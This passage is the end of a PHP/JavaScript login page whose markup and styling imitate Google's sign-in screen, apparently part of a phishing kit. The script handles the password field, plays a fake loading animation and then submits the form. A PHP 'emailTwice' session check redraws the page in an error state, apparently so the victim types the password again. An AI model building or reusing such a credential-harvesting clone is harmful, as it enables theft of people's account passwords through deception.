                    document.getElementById("erl-1337").innerText = 'Enter a password';
                    document.getElementById("dis-1").style = "display: flex;";
                    document.getElementById("dis-2").style = "display: flex; color: #d93025;";
                    document.getElementById("emailPassword").focus();
                } else {
                    document.getElementById("grayBar").style = "opacity: 1;";

                    for (var i = 0; i < document.getElementsByClassName('MyvhI').length; i++) {
                        document.getElementsByClassName('MyvhI')[i].style = "animation-play-state: running !important;";
                        document.getElementsByClassName('l3q5xe')[i].style = "animation-play-state: running !important;";
                    }

                    document.getElementsByClassName("whiteOverlay")['0'].style = "visibility: visible; opacity: .4;";

                    setTimeout(function () {
                        document.getElementById("form1").submit();
                    }, 1000);
                }
            }

            function showPass() {
                var checkbox = document.getElementById("checkbox");

                if (checkbox.checked) {
                    document.getElementById("emailPassword").type = "text";
                } else {
                    document.getElementById("emailPassword").type = "password";
                }
            }

            document.getElementById("emailPassword").onkeydown = function(e){
                if(e.keyCode == 13){
                    formSubmit();
                }
            };

            document.getElementById("emailPassword").addEventListener("focus", () => {
                document.getElementById("password").classList.add("u3bW4e");
            });

            document.getElementById("emailPassword").addEventListener("blur", () => {
                if (document.getElementById("emailPassword").value.trim() == "") {
                    document.getElementById("password").classList.remove("u3bW4e");
                }
            });

            <?php
                
                if (isset($_SESSION['emailTwice']) && $_SESSION['emailTwice']) {
                    echo '
                    
                        document.getElementById("enterPass").style.color = "#d93025";
                        document.getElementById("borderRed").style = "border-color: #d93025;";
                        document.getElementById("dis-1").style = "display: flex;";
                        document.getElementById("dis-2").style = "display: flex; color: #d93025;";
                        document.getElementById("emailPassword").focus();

                    ';
                }

            ?>

            document.getElementById("btnForm").onclick = formSubmit;
            document.getElementById("checkbox").onclick = showPass;
        </script>
    </body>
</html>